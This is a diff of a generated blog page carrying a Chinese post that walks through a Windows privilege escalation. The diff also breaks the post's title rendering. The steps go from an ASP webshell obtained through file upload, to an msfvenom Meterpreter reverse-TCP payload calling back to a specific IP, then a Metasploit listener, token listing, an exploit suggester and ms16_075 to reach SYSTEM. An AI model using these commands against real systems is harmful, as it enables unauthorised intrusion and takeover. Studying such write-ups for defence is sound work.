@@ -94,12 +94,12 @@
 
 
 
-  <meta name="description" content="通过任意文件上传获取到ASP webshell  生成msf meterpreter后门 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=183.6.50.204 LPORT=50124 -f exe &amp;gt; shell1.exe  启动监听 12345use exploit/multi/handlerset PAYLOAD windows">
+  <meta name="description" content="title: 记一次Windows提权过程date: 2019-07-10 09:25:10tags:   categories:   通过任意文件上传获取到ASP webshell   生成msf meterpreter后门  msfvenom -p windows/meterpreter/reverse_tcp LHOST=183.6.50.204 LPORT=50124 -f exe &amp;g">
 <meta property="og:type" content="article">
-<meta property="og:title" content="记一次Windows提权过程">
+<meta property="og:title" content="r0yanx&#39;s Blog">
 <meta property="og:url" content="https://ryaninf.github.io/2019/07/10/记一次Windows提权过程/index.html">
 <meta property="og:site_name" content="r0yanx&#39;s Blog">
-<meta property="og:description" content="通过任意文件上传获取到ASP webshell  生成msf meterpreter后门 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=183.6.50.204 LPORT=50124 -f exe &amp;gt; shell1.exe  启动监听 12345use exploit/multi/handlerset PAYLOAD windows">
+<meta property="og:description" content="title: 记一次Windows提权过程date: 2019-07-10 09:25:10tags:   categories:   通过任意文件上传获取到ASP webshell   生成msf meterpreter后门  msfvenom -p windows/meterpreter/reverse_tcp LHOST=183.6.50.204 LPORT=50124 -f exe &amp;g">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://ryaninf.github.io/2019/07/10/记一次Windows提权过程/2019-07-09-17-25-26.png">
 <meta property="og:image" content="https://ryaninf.github.io/2019/07/10/记一次Windows提权过程/2019-07-09-17-28-46.png">
@@ -109,10 +109,10 @@
 <meta property="og:image" content="https://ryaninf.github.io/2019/07/10/记一次Windows提权过程/2019-07-09-17-38-23.png">
 <meta property="og:image" content="https://ryaninf.github.io/2019/07/10/记一次Windows提权过程/2019-07-09-17-39-17.png">
 <meta property="og:image" content="https://ryaninf.github.io/2019/07/10/记一次Windows提权过程/2019-07-09-17-41-18.png">
-<meta property="og:updated_time" content="2019-07-10T01:39:41.047Z">
+<meta property="og:updated_time" content="2019-07-10T01:41:32.640Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="记一次Windows提权过程">
-<meta name="twitter:description" content="通过任意文件上传获取到ASP webshell  生成msf meterpreter后门 1msfvenom -p windows/meterpreter/reverse_tcp LHOST=183.6.50.204 LPORT=50124 -f exe &amp;gt; shell1.exe  启动监听 12345use exploit/multi/handlerset PAYLOAD windows">
+<meta name="twitter:title" content="r0yanx&#39;s Blog">
+<meta name="twitter:description" content="title: 记一次Windows提权过程date: 2019-07-10 09:25:10tags:   categories:   通过任意文件上传获取到ASP webshell   生成msf meterpreter后门  msfvenom -p windows/meterpreter/reverse_tcp LHOST=183.6.50.204 LPORT=50124 -f exe &amp;g">
 <meta name="twitter:image" content="https://ryaninf.github.io/2019/07/10/记一次Windows提权过程/2019-07-09-17-25-26.png">
 
 
@@ -131,7 +131,7 @@
   };
 </script>
 
-  <title>记一次Windows提权过程 | r0yanx's Blog</title>
+  <title> | r0yanx's Blog</title>
   
 
 
@@ -399,7 +399,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">记一次Windows提权过程
+          <h1 class="post-title" itemprop="name headline">
 
               
             
@@ -425,7 +425,7 @@
                 
               
 
-              <time title="创建时间：2019-07-10 09:25:10 / 修改时间：09:39:41" itemprop="dateCreated datePublished" datetime="2019-07-10T09:25:10+08:00">2019-07-10</time>
+              <time title="创建时间：2019-07-10 09:25:10 / 修改时间：09:41:32" itemprop="dateCreated datePublished" datetime="2019-07-10T09:25:10+08:00">2019-07-10</time>
             </span>
           
 
@@ -467,42 +467,29 @@
       
 
       
-        <ol>
-<li><p>通过任意文件上传获取到ASP webshell<br><img src="/2019/07/10/记一次Windows提权过程/2019-07-09-17-25-26.png" alt></p>
+        <hr>
+<p>title: 记一次Windows提权过程<br>date: 2019-07-10 09:25:10<br>tags:  </p>
+<h2 id="categories"><a href="#categories" class="headerlink" title="categories:  "></a>categories:  </h2><ol>
+<li>通过任意文件上传获取到ASP webshell<br><img src="/2019/07/10/记一次Windows提权过程/2019-07-09-17-25-26.png" alt>  </li>
+<li>生成msf meterpreter后门  <pre><code class="shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=183.6.50.204 LPORT=50124 -f exe &gt; shell1.exe  </code></pre>
 </li>
-<li><p>生成msf meterpreter后门</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=183.6.50.204 LPORT=50124 -f exe &gt; shell1.exe</span><br></pre></td></tr></table></figure>
+<li>启动监听  <pre><code class="shell">use exploit/multi/handler  
+set PAYLOAD windows/meterpreter/reverse_tcp  
+set LHOST x.x.x.x  
+set LPORT xx  
+exploit  </code></pre>
 </li>
-<li><p>启动监听</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST x.x.x.x</span><br><span class="line">set LPORT xx</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>通过webshell上传并执行木马<br><img src="/2019/07/10/记一次Windows提权过程/2019-07-09-17-28-46.png" alt></p>
-</li>
-<li><p>msf接收到回话<br><img src="/2019/07/10/记一次Windows提权过程/2019-07-09-17-32-21.png" alt></p>
-</li>
-<li><p>查看当前用户</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getuid</span><br></pre></td></tr></table></figure>
-
-</li>
-</ol>
-<p><img src="/2019/07/10/记一次Windows提权过程/2019-07-09-17-36-00.png" alt></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use incognito </span><br><span class="line">list_tokens -u</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2019/07/10/记一次Windows提权过程/2019-07-09-17-36-42.png" alt></p>
-<ol start="7">
-<li>查找可利用的提权exp<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/multi/recon/local_exploit_suggester</span><br></pre></td></tr></table></figure>
-
-</li>
-</ol>
-<p><img src="/2019/07/10/记一次Windows提权过程/2019-07-09-17-38-23.png" alt></p>
-<ol start="8">
-<li>把当前msf回话放到后台，并记住其session值为5<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bg</span><br></pre></td></tr></table></figure>
-
-</li>
-</ol>
-<p><img src="/2019/07/10/记一次Windows提权过程/2019-07-09-17-39-17.png" alt></p>
-<ol start="9">
-<li>利用ms16_075得到system权限<br><img src="/2019/07/10/记一次Windows提权过程/2019-07-09-17-41-18.png" alt></li>
+<li>通过webshell上传并执行木马<br><img src="/2019/07/10/记一次Windows提权过程/2019-07-09-17-28-46.png" alt>  </li>
+<li>msf接收到回话<br><img src="/2019/07/10/记一次Windows提权过程/2019-07-09-17-32-21.png" alt>  </li>
+<li>查看当前用户  <pre><code class="shell">getuid  </code></pre>
+<img src="/2019/07/10/记一次Windows提权过程/2019-07-09-17-36-00.png" alt>  <pre><code class="shell">use incognito   
+list_tokens -u  </code></pre>
+<img src="/2019/07/10/记一次Windows提权过程/2019-07-09-17-36-42.png" alt>  </li>
+<li>查找可利用的提权exp  <pre><code class="shell">run post/multi/recon/local_exploit_suggester  </code></pre>
+<img src="/2019/07/10/记一次Windows提权过程/2019-07-09-17-38-23.png" alt>  </li>
+<li>把当前msf回话放到后台，并记住其session值为5  <pre><code class="shell">bg  </code></pre>
+<img src="/2019/07/10/记一次Windows提权过程/2019-07-09-17-39-17.png" alt>  </li>
+<li>利用ms16_075得到system权限<br><img src="/2019/07/10/记一次Windows提权过程/2019-07-09-17-41-18.png" alt>  </li>
 </ol>
 
       
@@ -538,7 +525,7 @@
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
     
-    <a href="https://ryaninf.github.io/2019/07/10/记一次Windows提权过程/" title="记一次Windows提权过程">https://ryaninf.github.io/2019/07/10/记一次Windows提权过程/</a>
+    <a href="https://ryaninf.github.io/2019/07/10/记一次Windows提权过程/">https://ryaninf.github.io/2019/07/10/记一次Windows提权过程/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
@@ -614,8 +601,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <div class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -746,6 +742,23 @@
         </div>
       </div>
 
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#categories"><span class="nav-number">1.</span> <span class="nav-text">categories:  </span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
       
 
       
